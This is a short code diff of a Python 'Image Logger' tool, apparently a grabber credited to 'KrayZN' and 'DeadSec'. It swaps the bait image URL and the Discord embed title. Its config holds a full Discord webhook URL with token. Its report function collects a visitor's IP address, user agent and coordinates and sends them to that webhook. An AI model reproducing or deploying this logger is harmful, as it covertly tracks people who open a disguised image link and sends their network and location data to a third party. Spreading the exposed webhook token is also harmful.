@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1442962836769738873/H0Laz5ORaL_q5UH2MlHHAEANMXnBe3cy1gNcd2Fz-d98dRPCmdXFIwy9ELrQ3iRx9nJt",
-    "image": "https://cdn.discordapp.com/icons/1442962439829327925/370e65335ed7de4eee241263b2bbe362.png?size=512", 
+    "image": "https://media.discordapp.net/attachments/1439195224202153994/1442961584334045377/IMG_2124.jpg?ex=692aa1f2&is=69295072&hm=ee2d0642508416f22d2718c4207bbc084325d9fac7c81a7cd2df1011149e40d6&format=webp&", 
     "imageArgument": True,
 
     "username": "Made by KrayZN", 
@@ -125,7 +125,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - Updated 28/11/2025 By <@1006001923830317198>!",
+            "title": "Image Logger - Updated 28/11/2025 By <@&1006001923830317198>!",
             "color": config["color"],
             "description": f"""**Made by Unknown(K) , DeadSec On Top**
 
